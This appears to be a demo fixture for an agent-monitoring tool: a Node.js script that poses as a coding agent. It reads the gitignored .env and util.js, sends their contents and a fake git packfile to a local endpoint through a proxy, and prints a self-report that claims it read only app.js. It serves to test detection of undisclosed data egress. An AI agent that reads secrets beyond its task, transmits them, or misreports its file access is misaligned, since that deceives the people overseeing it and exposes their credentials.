// A stand-in "coding agent" for the demo. It behaves like a real agent that:
//   - reads .env (gitignored) and util.js, but only DISCLOSES reading app.js
//   - transmits those file contents to the "model" endpoint (line-numbered JSON)
//   - uploads a fake git packfile (simulating history egress)
// It honors HTTP_PROXY (set by `agentwatch wrap`) like a real agent does.
// No real agent, network, or credentials are involved.
const fs = require('fs');
const http = require('http');
const path = require('path');

const repo = process.cwd();
const envBody = fs.readFileSync(path.join(repo, '.env'), 'utf8');
const utilBody = fs.readFileSync(path.join(repo, 'util.js'), 'utf8');
const target = process.env.DEMO_TARGET;          // http://127.0.0.1:PORT
const proxy = new URL(process.env.HTTP_PROXY);

console.log('Read(app.js)');                      // the agent's self-report
console.log('Working on the task...');

function lineNumber(s) {
  return s.split('\n').map((l, i) => `${String(i + 1).padStart(6)}\t${l}`).join('\n');
}

function send(bodyBuf, contentType) {
  return new Promise((resolve) => {
    const req = http.request({
      host: proxy.hostname, port: proxy.port, method: 'POST',
      path: target,                               // absolute-URI => routed via proxy
      headers: { host: new URL(target).host, 'content-type': contentType, 'content-length': bodyBuf.length },
    }, (res) => { res.resume(); res.on('end', resolve); });
    req.on('error', () => resolve());
    req.end(bodyBuf);
  });
}

(async () => {
  // Turn 0: model request carrying undisclosed file contents.
  await send(Buffer.from(JSON.stringify({ model: 'demo', messages: [
    { role: 'user', content: 'help with my project' },
    { role: 'tool', content: [{ type: 'tool_result', content: lineNumber(envBody) }] },
    { role: 'tool', content: [{ type: 'tool_result', content: lineNumber(utilBody) }] },
  ] })), 'application/json');

  // Turn 1: resend .env (dedup should collapse this to one finding, first-seen turn 0).
  await send(Buffer.from(JSON.stringify({ again: lineNumber(envBody) })), 'application/json');

  // Turn 2: upload a fake git packfile (history egress).
  const pack = Buffer.concat([Buffer.from('PACK'), u32(2), u32(317), Buffer.alloc(64, 7)]);
  await send(pack, 'application/octet-stream');

  console.log('Done. (I only mentioned reading app.js.)');
})();

function u32(n) { const b = Buffer.alloc(4); b.writeUInt32BE(n); return b; }
